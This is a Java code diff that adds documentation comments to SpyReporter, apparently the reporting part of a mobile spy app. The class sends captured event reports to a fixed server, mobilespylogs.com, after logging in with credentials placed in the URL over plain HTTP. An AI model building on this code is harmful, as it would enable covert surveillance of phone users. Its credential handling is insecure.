@@ -18,6 +18,14 @@ import org.ddth.mobile.monitor.core.Event;
 import org.ddth.mobile.monitor.core.Report;
 import org.ddth.mobile.monitor.core.Reporter;
 
+/**
+ * This implements a generic reporter who takes care the authentication stage.
+ * Because all requests usually have to include an authentication token
+ * (session id), this implementation makes sure the session is always available
+ * beforehand for any requests to use.
+ * 
+ * @author khoanguyen
+ */
 public abstract class SpyReporter implements Reporter {
 	public static final String WEBAPI_SERVER_ROOT = "http://www.mobilespylogs.com/webapi";
 
@@ -34,7 +42,16 @@ public abstract class SpyReporter implements Reporter {
 			Logger.getDefault().debug("Server: " + body);
 		}
 	};
-	
+
+	/**
+	 * A logger that communicate with the server directly via HTTP. Currently,
+	 * we have only one communicating direction (from spy to server) and client
+	 * must authenticate against server using simple username/password
+	 * credentials and get the authentication toke (session) for further
+	 * requests.
+	 * 
+	 * @author khoanguyen
+	 */
 	public static class SpyLogger {
 		String session;
 		String username;
@@ -48,7 +65,13 @@ public abstract class SpyReporter implements Reporter {
 			this.username = username;
 			this.password = password;
 		}
-		
+
+		/**
+		 * Authenticate against the server and save the session if the
+		 * authentication is successfully.
+		 * 
+		 * @param handler
+		 */
 		public void login(final ResponseHandler handler) {
 			Request request = new Request(WEBAPI_SERVER_ROOT + "/login.php?username="
 					+ URLEncoder.encode(username) + "&password=" + URLEncoder.encode(password));
@@ -84,6 +107,15 @@ public abstract class SpyReporter implements Reporter {
 			return message;
 		}
 
+		/**
+		 * Send the given request to server asynchronously and send notification
+		 * about the connection states to the caller via a specified call back
+		 * handler. This uses a thread-pool to handle multiple requests come in
+		 * at once and closes the thread-pool as soon as the requests finished.
+		 * 
+		 * @param handler
+		 * @param request
+		 */
 		public void sendRequest(final ResponseHandler handler, Request request) {
 			connection.open();
 			connection.sendRequest(new ConnectionListener() {
@@ -130,8 +162,19 @@ public abstract class SpyReporter implements Reporter {
 		return logger;
 	}
 
+	/**
+	 * Subclass overrides this method to construct an HTTP request which will
+	 * be sent to the server each time this reporter catches an event & a report
+	 * need to be delivered to the server.
+	 *  
+	 * @param report
+	 * @return
+	 */
 	protected abstract Request createRequest(Report report);
 		
+	/**
+	 * @return The authentication token
+	 */
 	protected String getSession() {
 		return logger.session;
 	}
